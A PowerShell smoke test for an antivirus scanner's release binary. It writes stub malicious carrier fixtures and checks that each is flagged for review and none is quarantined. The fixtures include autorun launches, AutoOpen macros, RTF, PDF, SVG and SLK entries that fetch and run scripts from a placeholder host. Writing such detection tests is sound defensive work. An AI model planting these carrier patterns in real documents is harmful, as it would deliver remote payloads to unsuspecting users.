param(
  [string]$RepoRoot = $(Resolve-Path (Join-Path $PSScriptRoot "..\..")),
  [string]$LocalCorePath = "",
  [int]$TimeoutSeconds = 180
)

$ErrorActionPreference = "Stop"

function Get-BoundedText {
  param([AllowNull()][object]$Value, [int]$MaxChars = 4096)
  if ($null -eq $Value) { return "" }
  $text = [string]$Value
  $text = $text -replace "[`0-\x1F\x7F]+", " "
  if ($text.Length -le $MaxChars) { return $text }
  return $text.Substring(0, [Math]::Max(0, $MaxChars - 3)) + "..."
}

function Restore-EnvVar {
  param(
    [string]$Name,
    [AllowNull()][object]$Value
  )
  if ($null -eq $Value) {
    if (Test-Path -Path "Env:\$Name") {
      Remove-Item -Path "Env:\$Name" -ErrorAction Stop
    }
  } else {
    Set-Item -Path "Env:\$Name" -Value $Value -ErrorAction Stop
  }
}

function Resolve-LocalCoreBinary {
  param(
    [string]$Repo,
    [string]$ConfiguredPath
  )
  $candidate = $ConfiguredPath
  if ([string]::IsNullOrWhiteSpace($candidate)) {
    $candidate = Join-Path $Repo "target\release\zentor_local_core.exe"
  }
  if (-not (Test-Path -LiteralPath $candidate -PathType Leaf)) {
    throw "Release local-core binary is missing: $candidate. Run cargo build --release --manifest-path core\zentor_local_core\Cargo.toml first."
  }
  $resolved = (Resolve-Path -LiteralPath $candidate).Path
  if ([System.IO.Path]::GetFileName($resolved) -ne "zentor_local_core.exe") {
    throw "Release local-core quick-scan document/web carrier smoke expects zentor_local_core.exe, got: $resolved"
  }
  return $resolved
}

function Invoke-LocalCoreBinaryJson {
  param(
    [hashtable]$Command,
    [string]$InputJsonPath,
    [string]$Repo,
    [string]$Binary,
    [int]$Timeout
  )

  $json = $Command | ConvertTo-Json -Compress
  [System.IO.File]::WriteAllText(
    $InputJsonPath,
    $json + "`r`n",
    [System.Text.UTF8Encoding]::new($false)
  )

  $process = $null
  try {
    $startInfo = [System.Diagnostics.ProcessStartInfo]::new()
    $startInfo.FileName = "cmd.exe"
    $startInfo.WorkingDirectory = $Repo
    $startInfo.Arguments = "/d /c `"type `"$InputJsonPath`" | `"$Binary`"`""
    $startInfo.RedirectStandardOutput = $true
    $startInfo.RedirectStandardError = $true
    $startInfo.UseShellExecute = $false
    $startInfo.CreateNoWindow = $true

    $process = [System.Diagnostics.Process]::Start($startInfo)
    $stdoutTask = $process.StandardOutput.ReadToEndAsync()
    $stderrTask = $process.StandardError.ReadToEndAsync()

    if (-not $process.WaitForExit($Timeout * 1000)) {
      try {
        $process.Kill($true)
        $process.WaitForExit(5000) | Out-Null
      } catch {
        throw "release local-core quick-scan document/web carrier smoke timed out after ${Timeout}s and failed to stop: $(Get-BoundedText $_.Exception.Message)"
      }
      throw "release local-core quick-scan document/web carrier smoke timed out after ${Timeout}s."
    }

    $stdout = $stdoutTask.Result
    $stderr = $stderrTask.Result
    if ($process.ExitCode -ne 0) {
      throw "release local-core exited with $($process.ExitCode): $(Get-BoundedText $stderr)"
    }

    $jsonResponses = @()
    foreach ($line in ($stdout -split "`r?`n")) {
      $trimmed = $line.Trim()
      if ($trimmed.Length -eq 0) { continue }
      try {
        $body = $trimmed | ConvertFrom-Json -ErrorAction Stop
      } catch {
        throw "release local-core emitted non-JSON stdout during quick-scan document/web carrier smoke: $(Get-BoundedText $trimmed)"
      }
      if ($body.type -eq "scan_progress" -or $body.type -eq "progress") {
        continue
      }
      $jsonResponses += $body
    }
    if ($jsonResponses.Count -eq 0) {
      throw "release local-core produced no JSON response. stderr: $(Get-BoundedText $stderr)"
    }
    return $jsonResponses[-1]
  } finally {
    if ($null -ne $process -and -not $process.HasExited) {
      $process.Kill($true)
    }
  }
}

function New-CarrierFixture {
  param(
    [string]$FileName,
    [string]$Text,
    [string]$RequiredReason,
    [string[]]$ExpectedCategories
  )
  [ordered]@{
    FileName = $FileName
    Text = $Text
    RequiredReason = $RequiredReason
    ExpectedCategories = $ExpectedCategories
  }
}

function New-ZipEntryText {
  param(
    [System.IO.Compression.ZipArchive]$Archive,
    [string]$EntryName,
    [string]$Text
  )
  $entry = $Archive.CreateEntry($EntryName)
  $bytes = [System.Text.UTF8Encoding]::new($false).GetBytes($Text)
  $stream = $entry.Open()
  try {
    $stream.Write($bytes, 0, $bytes.Length)
  } finally {
    $stream.Dispose()
  }
}

function New-OoxmlMacroPackage {
  param(
    [string]$Path
  )
  Add-Type -AssemblyName System.IO.Compression
  Add-Type -AssemblyName System.IO.Compression.FileSystem
  if (Test-Path -LiteralPath $Path -PathType Leaf) {
    Remove-Item -LiteralPath $Path -Force -ErrorAction Stop
  }
  $archive = [System.IO.Compression.ZipFile]::Open($Path, [System.IO.Compression.ZipArchiveMode]::Create)
  try {
    New-ZipEntryText $archive "word/vbaProject.bin" "macro project placeholder"
    New-ZipEntryText $archive "word/_rels/document.xml.rels" '<Relationship TargetMode="External" Target="https://example.invalid/payload.ps1"/>'
  } finally {
    $archive.Dispose()
  }
}

$repo = (Resolve-Path -LiteralPath $RepoRoot).Path
$binary = Resolve-LocalCoreBinary $repo $LocalCorePath

$tempRoot = Join-Path ([System.IO.Path]::GetTempPath()) ("avorax-release-local-core-quickscan-document-web-carrier-smoke-" + [System.Guid]::NewGuid().ToString("N"))
$dataRoot = Join-Path $tempRoot "data"
$legacyRoot = Join-Path $tempRoot "legacy-data"
$quarantineRoot = Join-Path $tempRoot "quarantine"
$engineRoot = Join-Path $tempRoot "engine"
$downloadsRoot = Join-Path $tempRoot "Downloads"
$allowlistFile = Join-Path $tempRoot "allowlist.json"
$inputJson = Join-Path $tempRoot "local-core-command.json"

$previousDataDir = $env:AVORAX_DATA_DIR
$previousLegacyDataDir = $env:ZENTOR_LEGACY_DATA_DIR
$previousQuarantineDir = $env:AVORAX_QUARANTINE_DIR
$previousAllowlistFile = $env:ZENTOR_ALLOWLIST_FILE
$previousEngineDir = $env:AVORAX_ENGINE_DIR

try {
  New-Item -ItemType Directory -Path $dataRoot -Force | Out-Null
  New-Item -ItemType Directory -Path $legacyRoot -Force | Out-Null
  New-Item -ItemType Directory -Path $downloadsRoot -Force | Out-Null
  New-Item -ItemType Directory -Path (Join-Path $engineRoot "signatures") -Force | Out-Null
  New-Item -ItemType Directory -Path (Join-Path $engineRoot "rules") -Force | Out-Null
  New-Item -ItemType Directory -Path (Join-Path $engineRoot "ml") -Force | Out-Null
  New-Item -ItemType Directory -Path (Join-Path $engineRoot "trust") -Force | Out-Null
  New-Item -ItemType Directory -Path (Join-Path $engineRoot "config") -Force | Out-Null
  [System.IO.File]::WriteAllText(
    $allowlistFile,
    "[]`r`n",
    [System.Text.UTF8Encoding]::new($false)
  )

  $fixtures = @(
    (New-CarrierFixture "autorun.inf" @'
[autorun]
open=support.exe /quiet
shell\open\command=cmd.exe /c support.cmd
'@ "autorun_inf_executable_launch" @("persistenceIndicator")),
    (New-CarrierFixture "media-autorun.inf" @'
[autorun]
shellexecute=file://fileserver/share/support.vbs
'@ "autorun_inf_executable_launch" @("persistenceIndicator")),
    (New-CarrierFixture "invoice-email.eml" @'
From: billing@example.invalid
Subject: invoice
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="b"

--b
Content-Type: application/octet-stream; name="invoice.exe"
Content-Disposition: attachment; filename="invoice.exe"

placeholder
--b--
'@ "email_executable_attachment" @("suspiciousDownloader", "suspiciousScript")),
    (New-CarrierFixture "remote-query.iqy" "WEB`n1`nhttps://example.invalid/payload.ps1" "office_query_remote_script_launch" @("suspiciousDownloader")),
    (New-CarrierFixture "spreadsheet-link.slk" 'ID;PWXL;N;E
C;X1;Y1;K"powershell https://example.invalid/update.ps1"' "office_query_remote_script_launch" @("suspiciousDownloader")),
    (New-CarrierFixture "invoice.docm" "Sub AutoOpen()`npowershell https://example.invalid/payload.ps1`nEnd Sub" "office_macro_auto_run_remote_launch" @("maliciousMacro")),
    (New-CarrierFixture "budget.xlsm" "Sub AutoOpen()`npowershell https://example.invalid/payload.ps1`nEnd Sub" "office_macro_auto_run_remote_launch" @("maliciousMacro")),
    (New-CarrierFixture "briefing.pptm" "Sub AutoOpen()`npowershell https://example.invalid/payload.ps1`nEnd Sub" "office_macro_auto_run_remote_launch" @("maliciousMacro")),
    (New-CarrierFixture "invoice-legacy.doc" "Sub AutoOpen()`npowershell https://example.invalid/payload.ps1`nEnd Sub" "office_macro_auto_run_remote_launch" @("maliciousMacro")),
    (New-CarrierFixture "budget-legacy.xls" "Private Sub Workbook_Open()`n\\fileserver\share\support.vbs`nEnd Sub" "office_macro_auto_run_remote_launch" @("maliciousMacro")),
    (New-CarrierFixture "briefing-legacy.ppt" "Sub Presentation_Open()`nwscript.shell downloadstring start-process`nEnd Sub" "office_macro_auto_run_remote_launch" @("maliciousMacro")),
    (New-CarrierFixture "invoice-object.rtf" '{\rtf1{\object\objautlink\objupdate https://example.invalid/payload.ps1}}' "rtf_external_object_remote_launch" @("suspiciousDownloader")),
    (New-CarrierFixture "support-field.rtf" '{\rtf1{\field{\*\fldinst INCLUDETEXT file://fileserver/share/support.vbs}}}' "rtf_external_object_remote_launch" @("suspiciousDownloader")),
    (New-CarrierFixture "invoice-action.pdf" "%PDF-1.7`n1 0 obj << /OpenAction << /S /JavaScript /JS (app.launchURL('https://example.invalid/payload.js')) >> >>`nendobj" "pdf_active_content_remote_launch" @("suspiciousDownloader")),
    (New-CarrierFixture "support-launch.pdf" "%PDF-1.7`n2 0 obj << /OpenAction << /S /Launch /F (file://fileserver/share/support.vbs) >> >>`nendobj" "pdf_active_content_remote_launch" @("suspiciousDownloader")),
    (New-CarrierFixture "invoice-web.html" "<!doctype html><html><script>const u='https://example.invalid/payload.js'; const a=document.createElement('a'); a.download='payload.js';</script></html>" "web_document_active_content_remote_launch" @("suspiciousDownloader")),
    (New-CarrierFixture "diagram-loader.svg" "<svg onload=`"fetch('https://example.invalid/payload.js')`"></svg>" "web_document_active_content_remote_launch" @("suspiciousDownloader")),
    (New-CarrierFixture "support.chm" "<object data=`"https://example.invalid/payload.js`"></object>" "help_note_remote_script_launch" @("suspiciousDownloader")),
    (New-CarrierFixture "meeting.onepkg" "Attachment preview: powershell downloadstring start-process" "help_note_remote_script_launch" @("suspiciousDownloader")),
    (New-CarrierFixture "addin-loader.xlam" "<Relationship Target=`"https://example.invalid/payload.ps1`" />" "office_addin_remote_script_launch" @("suspiciousDownloader")),
    (New-CarrierFixture "report-addin.xll" "Add-in metadata: powershell downloadstring start-process" "office_addin_remote_script_launch" @("suspiciousDownloader"))
  )
  $packageFixture = [ordered]@{
    FileName = "invoice-package.docm"
    RequiredReason = "ooxml_macro_external_remote_relationship"
    ExpectedCategories = @("maliciousMacro")
  }

  foreach ($fixture in $fixtures) {
    $path = Join-Path $downloadsRoot $fixture.FileName
    [System.IO.File]::WriteAllText(
      $path,
      [string]$fixture.Text,
      [System.Text.UTF8Encoding]::new($false)
    )
  }
  New-OoxmlMacroPackage (Join-Path $downloadsRoot $packageFixture.FileName)
  $allFixtures = @($fixtures) + @($packageFixture)

  $benignFile = Join-Path $downloadsRoot "document-web-readme.txt"
  [System.IO.File]::WriteAllText(
    $benignFile,
    "benign document/web carrier smoke note`r`n",
    [System.Text.UTF8Encoding]::new($false)
  )

  $env:AVORAX_DATA_DIR = $dataRoot
  $env:ZENTOR_LEGACY_DATA_DIR = $legacyRoot
  $env:AVORAX_QUARANTINE_DIR = $quarantineRoot
  $env:ZENTOR_ALLOWLIST_FILE = $allowlistFile
  $env:AVORAX_ENGINE_DIR = $engineRoot

  $scan = Invoke-LocalCoreBinaryJson @{
    command = "quick_scan_selected_paths"
    paths = @($downloadsRoot)
    action_mode = "autoQuarantineConfirmedOnly"
    scan_kind = "quick"
  } $inputJson $repo $binary $TimeoutSeconds

  $expectedCarrierCount = @($allFixtures).Count
  if ($scan.status -ne "threatsFound") {
    throw "release local-core quick_scan_selected_paths did not return a threat status for document/web carrier fixtures: $(Get-BoundedText ($scan | ConvertTo-Json -Compress -Depth 8))"
  }
  $filesScanned = if ($null -ne $scan.files_scanned) { [int64]$scan.files_scanned } else { 0 }
  if ($filesScanned -lt $expectedCarrierCount) {
    throw "release local-core quick_scan_selected_paths did not scan every document/web carrier fixture: $(Get-BoundedText ($scan | ConvertTo-Json -Compress -Depth 8))"
  }
  $quarantinedFiles = if ($null -ne $scan.quarantined_files) { [int64]$scan.quarantined_files } else { 0 }
  if ($quarantinedFiles -ne 0) {
    throw "release local-core quick_scan_selected_paths quarantined review-only document/web carrier fixtures: $(Get-BoundedText ($scan | ConvertTo-Json -Compress -Depth 8))"
  }
  if (@($scan.scan_errors).Count -ne 0) {
    throw "release local-core quick_scan_selected_paths reported scan errors during document/web carrier smoke: $(Get-BoundedText ($scan.scan_errors | ConvertTo-Json -Compress -Depth 8))"
  }

  foreach ($fixture in $allFixtures) {
    $fixtureFile = Join-Path $downloadsRoot $fixture.FileName
    $threat = @($scan.threats) | Where-Object {
      $_.file_name -eq $fixture.FileName -and
      $_.detection_type -eq "heuristic" -and
      (@($fixture.ExpectedCategories) -contains $_.threat_category) -and
      $_.status -eq "detected" -and
      $_.recommended_action -eq "review" -and
      ($_.risk_score.verdict -eq "suspicious" -or $_.risk_score.verdict -eq "probableMalware")
    } | Select-Object -First 1
    if ($null -eq $threat) {
      throw "release local-core quick_scan_selected_paths did not report a review-only document/web carrier finding for $($fixture.FileName): $(Get-BoundedText ($scan | ConvertTo-Json -Compress -Depth 8))"
    }

    $reason = @($threat.risk_score.reasons) | Where-Object {
      $_.id -eq $fixture.RequiredReason
    } | Select-Object -First 1
    if ($null -eq $reason) {
      throw "release local-core quick_scan_selected_paths did not include $($fixture.RequiredReason) evidence for $($fixture.FileName): $(Get-BoundedText ($threat | ConvertTo-Json -Compress -Depth 12))"
    }
    if (-not (Test-Path -LiteralPath $fixtureFile -PathType Leaf)) {
      throw "release local-core quick_scan_selected_paths removed a review-only document/web carrier fixture: $fixtureFile"
    }
  }
  if (-not (Test-Path -LiteralPath $benignFile -PathType Leaf)) {
    throw "release local-core quick_scan_selected_paths removed the benign non-matching fixture"
  }

  $list = Invoke-LocalCoreBinaryJson @{ command = "list_quarantine" } $inputJson $repo $binary $TimeoutSeconds
  if ($list.ok -ne $true) {
    throw "release local-core list_quarantine failed after document/web carrier quick scan: $(Get-BoundedText ($list | ConvertTo-Json -Compress -Depth 8))"
  }
  if (@($list.records).Count -ne 0) {
    throw "release local-core created quarantine records after review-only document/web carrier scan: $(Get-BoundedText ($list | ConvertTo-Json -Compress -Depth 8))"
  }

  Write-Host "Avorax release local-core quick-scan document/web carrier smoke test passed."
  Write-Host "Binary: $binary"
  Write-Host "Engine dir: $engineRoot"
  Write-Host "Scan root: $downloadsRoot"
  Write-Host "Document/web carriers: $expectedCarrierCount"
  Write-Host "Files scanned: $filesScanned"
  Write-Host "Threats: $(@($scan.threats).Count)"
  Write-Host "Quarantined files: $quarantinedFiles"
} finally {
  Restore-EnvVar "AVORAX_DATA_DIR" $previousDataDir
  Restore-EnvVar "ZENTOR_LEGACY_DATA_DIR" $previousLegacyDataDir
  Restore-EnvVar "AVORAX_QUARANTINE_DIR" $previousQuarantineDir
  Restore-EnvVar "ZENTOR_ALLOWLIST_FILE" $previousAllowlistFile
  Restore-EnvVar "AVORAX_ENGINE_DIR" $previousEngineDir
  if (Test-Path -LiteralPath $tempRoot) {
    $resolvedTempRoot = (Resolve-Path -LiteralPath $tempRoot).Path
    $systemTempRoot = [System.IO.Path]::GetFullPath([System.IO.Path]::GetTempPath())
    if (-not $resolvedTempRoot.StartsWith($systemTempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
      throw "Refusing to delete non-temp smoke root: $resolvedTempRoot"
    }
    Remove-Item -LiteralPath $tempRoot -Recurse -Force -ErrorAction Stop
  }
}
